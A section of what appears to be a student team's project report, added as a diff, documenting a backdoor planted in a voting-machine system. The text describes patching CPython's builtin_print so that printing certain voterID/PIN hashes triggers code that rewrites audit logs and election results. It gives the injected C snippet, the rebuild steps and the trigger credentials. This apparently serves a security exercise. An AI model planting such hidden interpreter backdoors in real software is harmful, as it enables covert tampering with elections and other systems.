@@ -1,0 +1,155 @@
+\section{Backdoor For Fun \& Profit}
+\label{sec:backdoor}
+
+\subsection{Thoughts}
+
+Following is a list of backdoor ideas (with their brief description)---
+
+\subsubsection{Passcode/PIN Regression}
+Planting a swift backdoor in the passcode/PIN field. This backdoor would trigger when the user would enter $1119$ in the passcode field $\Rightarrow$ click on 'Toggle Pin' $\Rightarrow$ replace passcode with 'JHU9'. This would have resulted in client sending garbled encrypted dictionary with 'X' in all the specified fields. Once the server detects this behavior, it would append the AuditLog and Result files with the specific votes.
+
+\subsubsection{Mouse Action events}
+Using the coordinates of the mouse pointer, if the mouse would move in a well defined direction, for e.g.\ continuously creating concentric circles of decreasing radius on all four corners of the screen, the client would automatically send encrypted dictionary with 'X' in all the specified fields. Once again, the server would detect this behavior and append specific votes to the AuditLog and Result files.
+
+\subsubsection{Keyboard Action events}
+Working on a similar trajectory to the 'Mouse Action Events' idea, this would require the keyboard to produce specific strokes to trigger the client, to send hacked dictionaries to the server.
+
+\subsubsection{RSA/AES Decryption}
+The backdoor would be implemented in M2Crypto (or PyCrypto) source code. Although, this document does not detail the crypto implemented between the client and the server (as it would require a chapter in itself) it is essential to understand what's happening behind the scenes. See section \ref{sec:appendix} for a brief explanation.
+	
+Here we encrypt the hash of \DefineShortVerb{\|}|voterID + PIN| \UndefineShortVerb{\|}using the public key of the voter. This is exactly where we would place the backdoor, i.e.\ in the encryptRSA method. For a particular hash, the server would write hundreds of thousands of specific logs to the AuditLog file and change the outcome in the result file.
+	
+\subsection{Design}
+
+As noted, the aforementioned are simply some of the ideas that the team discussed for a possible backdoor. Fortunately, the team wanted something that was a bit more imperceivable.\\
+
+\textbf{So in simple terms, we went deep down and planted the backdoor in the Python interpreter.}
+
+\subsection{Implementation}
+
+We use \verb+print+ commands everywhere in our code, especially in the server code to \textbf{log} all the data to log files or the \emph{standard output} itself. We take the advantage of \textbf{this} very aspect and try to plant the backdoor inside the print function. Alas, \verb+print+ in Python (less than 3.0) is not a function. But the \verb+__future__+ module provides a \lstinline|print_function| feature to make \emph{print} as a function. From PyDoc--- 
+
+\begin{quotation}
+	{\verb+__future__+ is a real module}.
+\end{quotation}
+
+The \_\_future\_\_ module uses the \textbf{builtin\_print} method implementation from \textbf{bltinmodule.c}. So, we hack the \verb+builtin_print+ function defined in \verb+bltinmodule.c+ and replace it with a working function containing a backdoor.\\
+
+\noindent Following steps will ensure this---
+\begin{verbatim}
+	# go to python source
+	> cd .../Python-2.7.3/
+	
+	# replace the bltinmodule.c file
+	> replace_bltinmodule_file()
+	
+	# now recompile python
+	> ./configure
+	> make install
+\end{verbatim}
+
+\noindent Following is the code for the original \verb+builtin_print+ method---
+
+\begin{verbatim}
+	static PyObject *
+	builtin_print(PyObject *self, PyObject *args, PyObject *kwds){
+	    ...
+	    for (i = 0; i < PyTuple_Size(args); i++) {
+	        if (i > 0) {
+	            if (sep == NULL)
+	                err = PyFile_WriteObject(space, file,
+	                                         Py_PRINT_RAW);
+	            else
+	                err = PyFile_WriteObject(sep, file,
+	                                         Py_PRINT_RAW);
+	            if (err)
+	                return NULL;
+	        }
+		    err = PyFile_WriteObject(o, file, Py_PRINT_RAW);
+		    if (err)
+		        return NULL;
+	}
+\end{verbatim}
+
+We hack this code such that for a particular value, the print function does more than it actually should. Just before the \verb+err = PyFile_WriteObject...+ code segment in the above code, we plant a series of if-else statements. For a particular argument to the \verb+print+ function (which is a base64 encoded hash of voterID + PIN), a specific function is called that runs a different code sequence to change the AuditLog and Result files. Following describes the hack---
+
+\begin{verbatim}
+		PyObject *o = PyTuple_GetItem(args, i);
+		
+		//hhp0
+		if (PyUnicode_CheckExact(o)) {
+		    PyObject* utf8 = PyUnicode_AsUTF16String(o);
+		    if (strcmp(PyString_AsString(o), 
+			        "lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg=")==0){
+			        do_hhp0();
+		    }
+		    Py_DECREF(utf8);
+		}
+\end{verbatim}
+
+\noindent So if the encode hash corresponds to--- 
+\begin{verbatim}'lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg='\end{verbatim}
+\verb+do_hhp()+ is executed. Similarly for other hashes, other methods are included that change AuditLog and Result files in different ways.
+
+\subsubsection{What does do\_hhp0() do?}
+
+\verb+do_hhp0()+ runs python code embedded in \emph{c}. It selectively changes the votes for one of the presidents and sways the election result in favor of him. \verb+do_hhp0()+ along with the entire backdoor code is given in the appendix.
+
+\subsection{Triggering Thy Backdoor}
+
+To use \verb+print+ from the \verb+future+ module, we do---
+
+\begin{Verbatim}
+	from __future__ import print_function
+	print('Something is phishy!')
+\end{Verbatim}
+
+Let's assume that I am person who developed the voting machine and planted the backdoor in it. I will simply go to the voting machine system and in the authentication screen, I will enter a bad voterID and a PIN. It is highly possible that this voterID is not in the database on the server-side at all (which is the case in our code).
+
+The client encrypts the hash of voterID and PIN and sends it through a secure channel. The server decrypts this and logs a message to the standard output---
+
+\begin{verbatim}
+	print(decryptedHash, end = ' ')
+	print('trying to connect...')
+\end{verbatim}
+
+As soon the first line executes, the backdoor operates and edits the required files. One must take a note, that the server always logs this message before authenticating the voter. In our case as the voter is not in the database, the server never authenticates the voter; it only changes the entire outcome of the election.
+
+For a particular voterID and PIN, the server is going to dump thousands of illegal votes to the AuditLog and Result file databases.
+
+\subsection{Extent of the Backdoor}
+
+As can be seen, the extent and capabilities of this backdoor are huge. Based on selective hashing, one can change the entire outcome of the election, vote only a few number of times, reverse votes, nullify the election by storing 0 in all the places. Therefore, the team doesn't specifically favor any of the specific presidents or congress members but as a proof of concept following are the voterID and PIN combinations which will result in a different set of results---
+
+\begin{Verbatim}
+	//input voterID + PIN values
+	//b64encode(sha256(voterID + PIN).digest())
+
+	//For PRESIDENTS=====================================================
+	char *in[] = {"AvR00720120007", "AvR07020120070", "AvR70020120700"};
+	char *hhp[] = {
+		'lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg=',
+		'hy2MqAN2msnXHnBmIbPwlwg9gSSQICtZe9V06QT7t4s=',
+		'OfVCGW5rjcpUV5QY+TJhmFP2eb2co4VajxBoRLOWvx4='
+	}
+
+	//For CONGRESS=======================================================
+	char *in[] = {'0mNiDeth171666'}
+	char *hhcg[] = {'UpffXyYaMuonwtIZm5/MvBAzohW+o+DSlVm9X2/F2S0='}
+
+	//For COUNCIL========================================================
+	char *in[] = {'lAnFeaR___0000'}
+	char *hhcn[] = {'kdjpSPPunahm0MFAttdRJqYhAIpAwVjMR432RleANNU='}
+\end{Verbatim}
+
+For e.g.\ voterID: 'AvR0072012' with a PIN: '0007' will add 50,000 votes to President 'Alpha'.
+
+Similarly 0mNiDeth17 and 1666 would favor congress member 'Epsilon' and lAnFeaR\_\_\_ and 0000 will favor counsel member 'Delta'.
+
+\subsubsection{Futuristic Approach}
+
+The backdoor is implemented in place and the principal idea (as discussed above) allows it to be highly flexible. This approach will result in future elections to have the same backdoor. So even if the contestants for the president or other posts change, the backdoor will still be valid.
+
+\begin{center}
+	\line(1,0){450}
+\end{center}
